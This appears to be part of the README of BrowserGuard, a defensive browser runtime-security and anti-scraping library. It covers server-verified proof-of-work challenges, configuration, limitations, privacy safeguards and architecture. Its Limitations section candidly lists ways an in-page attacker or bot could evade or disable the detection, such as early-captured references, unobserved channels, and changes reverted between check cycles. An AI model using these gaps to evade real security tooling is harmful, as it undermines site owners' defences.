const Assessment = BrowserGuard.GetBotAssessment();
return Assessment?.Verdict === "bot" ? <Unavailable /> : <PriceTable />;
```

**2. Verdict header.** Every `fetch`/`XHR` request to your own origin (and to
`VerdictHeader.Origins`) carries:

```text
X-BrowserGuard-Verdict: human; score=0; sid=3f0c1d9e-…
```

On its own the header is a **claim**: a scraper that knows it can send `human`. Enable the
server-verifiable challenge (below) so your backend can tell a real BrowserGuard session from a
forged header. For external origins, the header triggers a CORS preflight: that server must allow
it in `Access-Control-Allow-Headers`.

### Server-side verification (challenge + proof of work)

1. Your server issues a **challenge signed with HMAC** (your secret never leaves the server),
   bound to the BrowserGuard session and with an expiry.
2. The browser solves a **proof of work** on it (a few hundred milliseconds, asynchronous, the UI
   is not blocked), renews it before it expires, and appends it to the verdict header:
   `...; proof=<challenge>~<solution>`.
3. Your server verifies signature, expiry, session and work, and gets a recommended decision.

```ts
// Browser
BrowserGuard.Start({
  Plugins: [AntiScraping({ Challenge: { Endpoint: "/api/challenge" } })],
});
```

```ts
// Server (Express shown; works in Node, Deno, Bun and edge runtimes: only Web Crypto)
import { CreateChallenge, VerifyRequest } from "@puertochenta/browser-guard/server";

const Secret = process.env.BROWSER_GUARD_SECRET; // random, 32+ characters

app.get("/api/challenge", async (req, res) => {
  res.json(await CreateChallenge({ Secret, SessionId: req.query.sid }));
});

app.use("/api", async (req, res, next) => {
  const { Decision, Proof, Verdict } = await VerifyRequest(req.headers, { Secret });
  if (Decision === "deny") return res.status(403).end(); // no valid proof, or verdict "bot"
  if (Decision === "challenge") return res.status(429).end(); // "suspicious" or expired: captcha
  next(); // Verdict.SessionId: use it for per-session rate limiting
});
```

| Client                                              | Proof                                           | Decision             |
| --------------------------------------------------- | ----------------------------------------------- | -------------------- |
| Browser running BrowserGuard, human behavior        | `valid`                                         | `allow`              |
| `curl`, Python `requests`, Scrapy (no JavaScript)   | `missing`                                       | `deny`               |
| Forged header (`human; score=0`)                    | `missing`/`invalid-signature`                   | `deny`               |
| Proof from another session, expired or without work | `session-mismatch` / `expired` / `invalid-work` | `deny` / `challenge` |
| Session classified as `suspicious` / `bot`          | `valid`                                         | `challenge` / `deny` |

`CreateChallenge({ Difficulty })` sets the work (8-24 bits, default 14; each bit doubles it).
`GetBotAssessment().Proof` tells the app whether the proof is `pending`, `ready` or `failed`, for
example to wait before calling a protected API.

> **What it guarantees and what it does not.** The proof shows that the client got a challenge
> from your server for that session and spent CPU on it: clients without JavaScript cannot forge
> the header, and every bot session costs computation. It does **not** prove the client is human:
> an automated real browser solves it like any visitor. That is what behavioral detection and
> rate limiting per session and IP are for.

### Captcha for suspicious sessions

BrowserGuard does not ship a captcha (each provider has its own SDK), but the `Bot` event is the
place to plug one in, and the server's `challenge` decision is the place to require it:

```ts
Guard.On("Bot", (Assessment) => {
  if (Assessment.Verdict === "suspicious") {
    ShowCaptcha(); // e.g. Cloudflare Turnstile or hCaptcha; verify its token on your server
  }
});
```

**3. Reporting.** Every detection creates a `bot` finding, delivered to `On()`, the history and
remote reporting. `GetStatus()` includes `Bot` and `SessionId`.

### Configuration

```ts
interface AntiScrapingConfig {
  Enabled?: boolean; // default: true (set false to keep the plugin but disable it, e.g. in e2e tests)
  Signals?: {
    Automation?: boolean;
    RequestRate?: boolean;
    Interaction?: boolean;
    Environment?: boolean;
  };
  MaxRequestsPerMinute?: number; // 10 - 10000. Default: 120
  SequentialThreshold?: number; // 3 - 1000. Default: 10
  ProtectSelector?: string; // default: "[data-guard-protect]"
  ProtectAt?: "suspicious" | "bot"; // default: "bot"
  Placeholder?: string; // default: "Content unavailable."
  Challenge?: {
    Endpoint: string; // issues challenges (https, same origin or localhost)
  };
  VerdictHeader?: {
    Enabled?: boolean; // default: true
    Name?: string; // default: "X-BrowserGuard-Verdict"
    Origins?: string[]; // external origins that also receive the header
  };
}
```

### False positives to keep in mind

- End-to-end tests (Cypress, Playwright, Selenium) are classified as `bot`: use
  `AntiScraping({ Enabled: false })` in those environments.
- Some browsers in virtual machines or without GPU acceleration use software rendering
  (`env-software-gl`, 25 points: not enough for `suspicious` on its own).
- Users who open the page in a background tab do not trigger `no-interaction` (it only counts
  while the tab is visible).
- Keep `ProtectAt: "bot"` (default) to avoid removing content from merely suspicious sessions.

## Limitations

- **Load order.** Only what happens after `Start()` is observed. Malicious code running earlier
  (for example, a script injected in the HTML) can tamper with the environment unseen;
  `RuntimeMonitor` only reports it if it leaves non-native-looking functions behind.
- **Evasion.** An attacker with code execution in the page can, in theory, detect and disable
  BrowserGuard, use references captured before start, or use channels that are still not
  observed (`WebRTC` data channels, workers, navigation via `location`). BrowserGuard increases
  visibility; it is not a barrier.
- **Realms.** Same-origin iframes are protected when a script reaches them or when they are
  inserted. A realm reached synchronously through `window.frames[i]` in the same task that
  inserted the iframe, workers, and cross-origin frames are not observed.
- **Proxies.** A `Proxy` over a native function reports `[native code]`; that is why replacements
  are mainly detected by reference comparison.
- **Periodic checks.** Prototype and critical-function changes are detected on the next check
  cycle (2-5 s depending on the preset), not instantly. A change reverted before the next cycle
  can go unnoticed.
- **DOM.** Changing the `src` of an existing script is not detected. Event handlers assigned as
  functions (`img.onerror = fn`) are not sinks and are not observed. Element insertion events and
  resource loads carry no stack trace (they are reported asynchronously by the browser); sink and
  channel findings do.
- **DOM XSS.** Detection is based on indicators, not on full taint tracking: an encoded or
  transformed payload may not be recognized as reflected, and `eval` / `new Function` are not
  intercepted (see [XssSinkDetector](#xsssinkdetector-dom-xss)).
- **False positives.** Observability libraries (Sentry, Datadog, zone.js) legitimately wrap
  `fetch`/XHR and may be reported as `runtime-integrity`. Polyfills extending prototypes are
  reported as `low`. Use `AllowedOrigins`, presets and `Risk.Weights` to tune this.
- **Unknown URLs.** To avoid running application code, only `string`, `URL` and `Request`
  destinations are interpreted; other objects are recorded as `[unknown]`.
- **CSP.** `CspMonitor` only works when the page has a CSP policy.
- **Anti-scraping.** On the client it does not stop JavaScript-less scrapers or bots that
  neutralize the script (the server-side challenge rejects the former); the proof of work does not
  prove the client is human; query-string pagination (`?page=2`) is not detected as a crawl, because the query is
  discarded for privacy. See [Anti-scraping](#anti-scraping).

## Security

BrowserGuard is designed not to become a data leak itself:

- **It never records** passwords, cookies, headers (including `Authorization`), HTTP bodies,
  form contents, inline script contents, the clipboard or keystrokes.
- **Sanitized URLs:** stored without query string, fragment or credentials (`user:pass@`),
  because tokens often travel in the query. Only `HasQuery: true` is kept. `data:`, `blob:` and
  `javascript:` URLs are recorded by scheme only.
- **Sanitized evidence:** all evidence goes through `SafeSerializer`, which redacts sensitive
  keys (`password`, `token`, `secret`, `cookie`, `authorization`, `session`, `apiKey`,
  `cardNumber`, `cvv`, ...) and values shaped like JWTs, `Bearer` tokens or card numbers, and
  bounds depth and size.
- **Local by default.** No telemetry. Nothing leaves the browser unless you add the
  `RemoteReporting` plugin (only `https`, same origin or `localhost`) or send it yourself. Remote
  reporting never includes cookies (`credentials: "omit"`) or the `Referer` header, and the page
  path is sent without its query string.
- **No fingerprinting.** The optional `AntiScraping` checks compare browser properties and
  discard the values: only signal names are recorded, never an identifying fingerprint.
- **Error isolation.** Every internal error is counted in `GetStatus().InternalErrors` and never
  propagates to the application.
- **Bounded memory.** History, timeline, event queue (1000) and deduplication cache have fixed
  limits.

To report a vulnerability, see [SECURITY.md](SECURITY.md).

## Performance

Decisions with a performance impact:

| Area                                            | Decision                                                                                                                                                                                                                                   |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Hot path (`fetch`, `XHR.send`, `new WebSocket`) | The hook only builds a small event and captures the stack. Detection, scoring and reporting are deferred to a microtask and processed in batches.                                                                                          |
| Stack traces                                    | Only at network interception points, limited to 8-16 frames. Never in high-volume callbacks.                                                                                                                                               |
| `MutationObserver`                              | Only `childList` + `subtree`; no `attributes` or `characterData`. A single `querySelectorAll` per inserted subtree, and only if it has children.                                                                                           |
| DOM XSS sinks                                   | A cheap prefilter skips harmless writes without running the detailed analysis, capturing a stack or reading `location`. Measured overhead per harmless call (Chrome / Firefox): `innerHTML` +0.5 / +0.7 µs, `setAttribute` +0.2 / +0.3 µs. |
| Resources                                       | `PerformanceObserver` reports downloads without patching any API; findings for equivalent destinations are grouped for 10 s.                                                                                                               |
| Same-origin iframes                             | Monitors are installed in a frame realm only when a script reaches it (or when the frame is inserted), at most 20 realms at a time.                                                                                                        |
| Prototypes and runtime                          | No aggressive polling: reference comparison of ~150 descriptors and 11 functions every 2-5 s, run in `requestIdleCallback` when available, chaining `setTimeout` (runs never pile up).                                                     |
| Serialization                                   | Only finding evidence, with bounded depth, keys and length.                                                                                                                                                                                |
| Console                                         | Per-preset threshold and 10 s deduplication.                                                                                                                                                                                               |
| Bursts                                          | The event queue drops events beyond 1000 pending (`GetStatus().DroppedEvents`).                                                                                                                                                            |

Reference measurement (Chrome, this repository's demo): the overhead per intercepted `fetch`
call is about **50 µs**, dominated by stack trace capture; on `XMLHttpRequest.open` it is
negligible. Bundle size for an application that imports only the core: ~58 KB minified,
~18 KB gzip, with no dependencies; each plugin adds its own size (see [Plugins](#plugins)).
In production bundles (library and app in the same file) stack traces still point to your code:
internal frames are dropped by position, not by file name.

## Architecture

```text
BrowserGuard
    ↓  registers and starts
Monitors ──────────── observe and emit SecurityEvents (decide nothing)
    ↓  GuardContext: queue + microtask
EventBus (internal)
    ↓
Detectors ─────────── analyze events and produce candidates with signals
    ↓
RiskEngine ────────── signals → score 0-100 → severity → SecurityFinding
    ↓
History + public events + Reporters
```

```text
src/
├── BrowserGuard.ts           # public facade and orchestration
├── Index.ts                  # public exports
├── Config/                   # presets and configuration resolution
├── Core/                     # EventBus, RiskEngine, GuardContext, MonitorRegistry,
│                             # FunctionPatch, FindingHistory, RiskSignals, Components,
│                             # PluginManager, BotSession, AntiScrapingController
├── Plugins/                  # entry points: AntiScraping, RemoteReporting
├── Types/                    # public and internal types
├── Monitors/                 # Fetch, Xhr, WebSocket, Dom, Csp, Prototype, Runtime,
│                             # Automation, Interaction
├── Detectors/                # Network, ScriptInjection, CspViolation,
│                             # PrototypePollution, RuntimeIntegrity, Bot
├── Protection/               # ContentShield, ChallengeClient (anti-scraping)
├── Server/                   # entry point: CreateChallenge, VerifyRequest (backend)
├── Reporters/                # Reporter, ConsoleReporter, ConsoleNotice,
│                             # RemoteReporter, RemoteTransport
└── Utils/                    # StackTrace, UrlUtils, SafeSerializer, NativeFunctionUtils,
                              # RingBuffer, PeriodicTask, IdGenerator, AutomationSignals
```

To add a monitor: implement `Monitor` (or extend `BaseMonitor`), emit events with
`GuardContext.Emit()` and register it in `Core/Components.ts`. To add a detector: implement
`Detector`, declare the event types in `Handles` and return a `FindingCandidate` with signals.

Source code comments are written in Spanish.

## Development

Requires Node 22.12 or later (see `.nvmrc`) and pnpm.

```bash
pnpm install
pnpm build          # tsup → dist/index.js + dist/index.d.ts
pnpm typecheck      # tsc (src + tests, and e2e with Node types)
pnpm lint           # eslint (typescript-eslint strict)
pnpm test           # vitest (watch)
pnpm test:run       # unit tests (jsdom)
pnpm test:coverage  # coverage (80% threshold on Core and Detectors)
pnpm test:e2e       # builds and tests dist/ in real Chromium, Firefox and WebKit (Playwright)
pnpm test:package   # packs the .tgz, installs it in a temp project and type-checks it
pnpm format         # prettier
```

The first time, install the Playwright browsers: `pnpm exec playwright install chromium firefox`.

**Two test levels:**

- **Unit (Vitest + jsdom):** detection logic, scoring, configuration and lifecycle. jsdom does not
  implement CSP and defines in JavaScript functions that are native in a browser, so those cases
  are simulated and documented in each test.
- **End-to-end (Playwright):** test the built bundle (what gets published) in real browsers: real
  CSP violations, native function detection, clean stack traces (also when the library is bundled
  together with the app), restoration on `Stop()`, automated browser detection, verdict header
  and remote reporting.
- **Package (`test:package`):** installs the packed tarball like a user would and type-checks the
  entry points with `Bundler`, `NodeNext` and `Node10` module resolution, then imports them in
  Node (SSR).

**CI** (`.github/workflows/ci.yml`): formatting, lint, types, unit tests with coverage, build and
package check on Node 22 and 24; e2e tests in Chromium, Firefox and WebKit; example builds.

**Versioning and publishing** with [changesets](https://github.com/changesets/changesets):

```bash
pnpm changeset   # describe your change (patch / minor / major)
```

On merge to `main`, the `release.yml` workflow opens a PR with the new version and CHANGELOG;
merging that PR publishes to npm with
[provenance](https://docs.npmjs.com/generating-provenance-statements). It requires the
`NPM_TOKEN` repository secret. Because of the provenance setting, publishing happens from CI, not
from a local machine.

## Roadmap

Included in 0.1.0: network, DOM, CSP, prototype and runtime integrity monitors; plugin system;
`RemoteReporting` and `AntiScraping` plugins; custom reporters (`Reporters`).

- **v0.2:** DOM XSS detection in dangerous sinks: `innerHTML`, `outerHTML`, `document.write`,
  `insertAdjacentHTML`, `setAttribute`, string timers (✅ available: `SinkMonitor`).
- **v0.3:** Trusted Types integration.
- **v0.4:** Subresource Integrity analysis and supply-chain monitoring.
- **v0.5:** advanced forensic timeline.
- **v0.6:** ready-made integrations for specific SIEMs; server-verifiable anti-scraping token.
- **v1.0:** Browser Runtime Security Platform.

Active prevention of network requests and scripts (detect + prevent) may be evaluated in future
versions; today BrowserGuard detects and reports (the only active reaction is the optional
content protection of `AntiScraping`).

## License

[MIT](LICENSE) © @puertochenta
